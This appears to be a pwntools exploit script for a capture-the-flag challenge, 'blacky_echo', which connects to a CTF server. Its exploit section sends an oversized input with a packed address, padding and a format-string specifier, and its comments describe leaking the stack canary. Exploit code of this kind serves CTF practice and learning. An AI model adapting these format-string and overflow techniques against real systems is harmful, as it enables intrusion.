#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'blacky_echo', checksec=False)

host = args.HOST or 'blacky-echo.challs.olicyber.it'
port = int(args.PORT or 11002)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

# %24$p leak the canary on format leak
# %31$p go() buffer

context.log_level='debug'

io = start()

io.sendlineafter(b'Size: ', str((1 << 17) + 1).encode())
io.sendlineafter(b'Input: ', p64(0x00400d90) + b'.' * (65538) + f'%31$p'.encode())

print(io.recvline())

io.close()